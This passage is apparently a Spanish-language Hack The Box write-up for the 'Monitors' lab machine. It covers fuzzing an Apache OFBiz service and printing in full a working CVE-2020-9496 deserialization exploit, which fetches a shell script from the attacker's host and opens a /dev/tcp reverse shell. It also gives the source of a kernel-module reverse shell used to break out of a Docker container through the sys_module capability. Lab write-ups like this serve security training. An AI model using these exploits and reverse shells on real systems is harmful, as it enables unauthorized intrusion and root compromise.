+</code></pre>
+
+<p>Veamos el servicio desde nuestro navegador.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Monitors/moni5.PNG" alt="" /></p>
+
+<p>Nos arroja el codigo de estado <code>404 not found</code>. Ahora trataremos con <code>wfuzz</code>.</p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://127.0.0.1:8443/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://127.0.0.1:8443/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000016:   302        0 L      0 W        0 Ch        "images"                                                                                                              
+000000075:   302        0 L      0 W        0 Ch        "content"                                                                                                             
+000000152:   302        0 L      0 W        0 Ch        "common"                                                                                                              
+000000242:   302        0 L      0 W        0 Ch        "catalog"                                                                                                             
+000000564:   302        0 L      0 W        0 Ch        "marketing"                                                                                                           
+000000779:   302        0 L      0 W        0 Ch        "ecommerce"                                                                                                           
+000000920:   302        0 L      0 W        0 Ch        "ap"                                                                                                                  
+000001128:   302        0 L      0 W        0 Ch        "ar"                                                                                                                  
+</code></pre>
+
+<p>Vemos varias rutas que nos dan un codigo de estado <code>302 redirect</code>, y si provamos con la ruta <code>ecommerce</code>, en el navegador vemos algo relacionado a <code>ofbizsetup</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Monitors/moni6.PNG" alt="" /></p>
+
+<p>Como sabemos se esta usando el servicio de <code>apache</code> asi que podemos tratar de buscar vulnerabilidades asociadas a <code>apacheofbiz</code> y encontramos una de <code>RCE</code>.</p>
+
+<pre><code class="language-bash">❯ searchsploit apacheofbiz
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                                | java/webapps/50178.sh
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Examinamos el <code>exploit</code> y vemos que aprovecha una vulnerabilidad de serealizacion.</p>
+
+<pre><code class="language-java"># Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
+# Date: 2021-08-04
+# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)
+# Vendor Homepage: https://ofbiz.apache.org/index.html
+# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
+# Version: 17.12.01
+# Tested on: Linux
+
+# CVE : CVE-2020-9496
+
+# Step 1: Host HTTP Service with python3 (sudo python3 -m http.server 80)
+# Step 2: Start nc listener (Recommended 8001).
+# Step 3: Run the exploit.
+
+
+url='https://127.0.0.1' # CHANGE THIS
+port=8443 # CHANGE THIS
+
+function helpPanel(){
+    echo -e "\nUsage:"
+    echo -e "\t[-i] Attacker's IP"
+    echo -e "\t[-p] Attacker's Port"
+    echo -e "\t[-h] Show help pannel"
+    exit 1
+}
+
+
+function ctrl_c(){
+    echo -e "\n\n[!] Exiting...\n"
+    exit 1
+}
+# Ctrl + C
+trap ctrl_c INT
+
+function webRequest(){
+    echo -e "\n[*] Creating a shell file with bash\n"
+    echo -e "#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/$ip/$ncport 0&gt;&amp;1" &gt; shell.sh
+    echo -e "[*] Downloading YsoSerial JAR File\n"
+    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
+    echo -e "[*] Generating a JAR payload\n"
+    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "wget $ip/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
+    echo -e "[*] Sending malicious shell to server...\n" &amp;&amp; sleep 0.5
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt;$payload&lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
+    echo -e "[*] Generating a second JAR payload"
+    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
+    echo -e "\n[*] Executing the payload in the server...\n" &amp;&amp; sleep 0.5
+    curl -s $url:$port/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt;$payload2&lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
+    echo -e "\n[*]Deleting Files..."
+    rm ysoserial-master-d367e379d9-1.jar &amp;&amp; rm shell.sh
+}
+
+declare -i parameter_enable=0; while getopts ":i:p:h:" arg; do
+    case $arg in
+        i) ip=$OPTARG; let parameter_enable+=1;;
+        p) ncport=$OPTARG; let parameter_enable+=1;;
+        h) helpPanel;;
+    esac
+done
+
+if [ $parameter_enable -ne 2 ]; then
+    helpPanel
+else
+    webRequest
+fi
+</code></pre>
+
+<p>Ejecutamos el <code>exploit</code> nos pide como parametros nuestra ip de atacante y un puerto especifico.</p>
+
+<pre><code class="language-bash">❯ bash ofbiz.sh
+
+Usage:
+	[-i] Attacker's IP
+	[-p] Attacker's Port
+	[-h] Show help pannel
+</code></pre>
+
+<p>Nos compartimos un servicio web con <code>python3</code> ya que el <code>exploit</code> hara una petición a nuestra maquina solicitando un archivo de nombre <code>shell.sh</code> el cual previamente creara y con el cual nos devolvera una conexion al puerto que le especificamos. Seguidamente nos pondremos en escucha con <code>ncat</code> y lanzamos el <code>exploit</code>.</p>
+
+<pre><code class="language-bash">❯ bash ofbiz.sh -i 10.10.16.3 -p 443
+
+[*] Creating a shell file with bash
+
+[*] Downloading YsoSerial JAR File
+
+[*] Generating a JAR payload
+
+[*] Sending malicious shell to server...
+
+[*] Generating a second JAR payload
+
+[*] Executing the payload in the server...
+
+
+[*]Deleting Files...
+❯ cat ofbiz.sh
+</code></pre>
+
+<p>Recibimos la petición.</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.238 - - [14/May/2023 22:43:38] "GET /shell.sh HTTP/1.1" 200 -
+</code></pre>
+
+<p>y ganamos acceso, pero a un contenedor.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.238.
+Ncat: Connection from 10.10.10.238:40592.
+bash: cannot set terminal process group (32): Inappropriate ioctl for device
+bash: no job control in this shell
+root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# whoami
+whoami
+root
+root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# hostname -I
+hostname -I
+172.17.0.2 
+root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01#
+</code></pre>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Haremos el mismo proceso anterior para obtener una <code>tty full interactive</code>. Lo siguiente que haremos sera descargarnos el <code>linpeas.sh</code> del repositorio de <code>carlospolop</code> y subirlo al contenedor para buscar formas potenciales de elevar nuestro privilegio.</p>
+
+<pre><code class="language-bash">root@b097fc57960e:/tmp# wget http://10.10.16.3/linpeas.sh
+--2023-05-14 22:54:08--  http://10.10.16.3/linpeas.sh
+Connecting to 10.10.16.3:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 835306 (816K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+</code></pre>
+
+<p>Le damos permiso al archivo y lo ejecutamos.</p>
+
+<pre><code class="language-bash">root@b097fc57960e:/tmp# chmod +x linpeas.sh 
+root@b097fc57960e:/tmp# ./linpeas.sh
+</code></pre>
+
+<p>Despues de esperar a que nos haga un reconocimento, nos reporta algo potencial referente a una capability <code>sys_module</code> con la cual podemos convertirnos en <code>root</code> en la maquina real.</p>
+
+<pre><code class="language-bash">╔══════════╣ Container Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=
+</code></pre>
+
+<p>Si quieres saber mas al respecto puedes guiarte de este articulo.</p>
+
+<p>*<a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd</a></p>
+
+<p>Lo primero que debemos hacer es crear un archivo <code>reverse-shell.c</code> con un contenido especifico, donde podemos cambiar la <code>ip y puerto</code> en el cual deseamos recibir la conexión, en este caso yo realizare la conexión en la interface <code>docker</code> del usuario <code>marcus</code> la cual corresponde a la <code>172.17.0.1</code> y en cuanto al puerto usare el que esta por defecto <code>4444</code>.</p>
+
+<pre><code class="language-bash">#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO "Exiting\n");
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+</code></pre>
+
+<p>Seguidamente crearemos un archivo <code>makefile</code> con otro contenido especifico.</p>
+
+<pre><code class="language-bash">obj-m +=reverse-shell.o
+all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+</code></pre>
+
+<p>Despues ejecutaremos un <code>make</code> para compilarlo, este nos creara un archivo <code>.ko</code>.</p>
+
+<pre><code class="language-bash">root@b097fc57960e:/tmp# make
+make -C /lib/modules/4.15.0-151-generic/build M=/tmp modules
+make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
+  CC [M]  /tmp/reverse-shell.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /tmp/reverse-shell.mod.o
+  LD [M]  /tmp/reverse-shell.ko
+make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
+root@b097fc57960e:/tmp# ls
+Makefile		      gradle2795579439185181258.bin  gradle6644211106987001499.bin  gradle9039635524913268865.bin  hsperfdata_root  reverse-shell.ko	 shell.sh
+Module.symvers		      gradle2983053951583899525.bin  gradle7006611085073049553.bin  gradle9084471384540617701.bin  linpeas.sh	    reverse-shell.mod.c
+gradle1338051207622881975.bin  gradle3783653524079408204.bin  gradle7211342044412775236.bin  gradle9170701421662864177.bin  modules.order    reverse-shell.mod.o
+gradle251280844494394051.bin   gradle4550055017114582402.bin  gradle8316659095765584843.bin  gradle984417515461424419.bin   reverse-shell.c  reverse-shell.o
+</code></pre>
+
+<p>finalmente debemos ponernos en escucha en el puerto especifico con <code>ncat</code> y ejecutar el <code>reverse-shell.ko</code> con <code>insmod</code>.</p>
+
+<pre><code class="language-bash">root@b097fc57960e:/tmp# insmod reverse-shell.ko 
+root@b097fc57960e:/tmp#
+</code></pre>
+
+<p>y recibimos la conexión como <code>root</code> en la maquina real.</p>
+
+<pre><code class="language-bash">marcus@monitors:~$ nc -nlvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.10.238 36840 received!
+bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@monitors:/# whoami
+whoami
+root
+root@monitors:/# hostname -I
+hostname -I
+10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
+</code></pre>
+
+<p>Lo que nos queda ahora es ir al directorio personal del usuario <code>root</code> y visualizar la segunda flag <code>root.txt</code> 😄.</p>
+
+<pre><code class="language-bash">root@monitors:/# cd /root
+cd /root
+root@monitors:/root# cat root.txt
+cat root.txt
+9f3208a5ff66eb9a612aaba91ea35eae
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Monitors - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Monitors" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
